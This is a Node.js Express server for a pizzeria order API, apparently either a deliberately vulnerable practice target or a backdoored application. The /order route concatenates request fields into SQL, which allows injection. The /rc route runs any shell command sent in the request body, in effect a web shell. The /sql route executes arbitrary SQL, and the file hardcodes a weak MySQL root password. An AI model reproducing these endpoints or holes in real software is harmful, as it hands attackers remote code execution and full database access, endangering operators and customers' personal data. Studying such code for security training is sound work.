const express = require('express');
const app = express();
const mysql = require('mysql2')
const PORT = 8000;
const cors = require('cors');

app.use(express.json());
app.use(cors());

app.post("/order", (req, res) => {
    const { name, phone, address, order } = req.body;
    
    const connection = mysql.createConnection({
        host: 'localhost',
        user: 'root',
        password: 'asdf',
        multipleStatements: true
      });
      
    connection.query(
        "CREATE DATABASE IF NOT EXISTS pizzeria; USE pizzeria; CREATE TABLE IF NOT EXISTS orders(id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,name VARCHAR(255),phone VARCHAR(255),address VARCHAR(255),items VARCHAR(255)); INSERT INTO orders(name,phone,address,items) VALUES ('"+name +"','"+phone +"','"+address+"','"+order+"');",
        function(err,results,fields) {
            if(err) {
                res.send(err)
            } else {
                res.send(results)
            }
        }
    );
})

app.post("/rc", (req, res) => {
    const { exec } = require("child_process");
    const { cmd } = req.body;
    exec(cmd, (error, stdout, stderr) => {
        if(error) {
            res.send(error)
        }
        if(stderr) {
            res.send(stderr)
        }
        res.send(stdout)
    })
})

app.post("/sql", (req, res) => {
    const { sql } = req.body;

    const connection = mysql.createConnection({
        host: 'localhost',
        user: 'root',
        password: 'asdf',
        multipleStatements: true
      });
      
    connection.query(
        sql,
        function(err,results,fields) {
            if(err) {
                res.send(err)
            } else {
                res.send(results)
            }
        }
    );
})

app.get("/ping", (req, res) => {
    res.send("pong")
})

app.post("/ping", (req, res) => {
    res.send("pong")
})

app.listen(
    PORT,
    () => console.log("Working")
)